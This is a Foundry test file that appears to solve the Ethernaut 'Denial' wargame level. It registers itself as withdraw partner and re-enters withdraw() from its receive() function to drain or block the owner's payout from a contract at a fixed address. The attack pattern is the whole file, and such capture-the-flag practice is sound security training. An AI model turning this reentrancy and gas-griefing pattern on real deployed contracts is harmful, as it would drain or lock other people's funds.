// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Denial} from "../src/Denial.sol";

contract CounterTest is Test {
    Denial public denial;

    address payable addr = payable(0xF26684000659A82C900d46FA90012B5A719a9dd0);
    uint public balanceThresh = 499837029899223;

    uint public balanceBefore;

    function setUp() public {
        denial = Denial(addr);
        balanceBefore = address(0xA9E).balance;
    }

    function testAttack() public {
        denial.setWithdrawPartner(address(this));

        try denial.withdraw() {
            console.log(denial.contractBalance());
            assertTrue(false);
        } catch Error(string memory reason) {
            console.log("exception");
            assertEq(address(0xA9E).balance, balanceBefore);
        } catch (bytes memory) {
            console.log("exception");
            assertEq(address(0xA9E).balance, balanceBefore);
        }
    }

    receive() external payable {
        if (denial.contractBalance() > balanceThresh) {
            denial.withdraw();
        }
    }
    
}
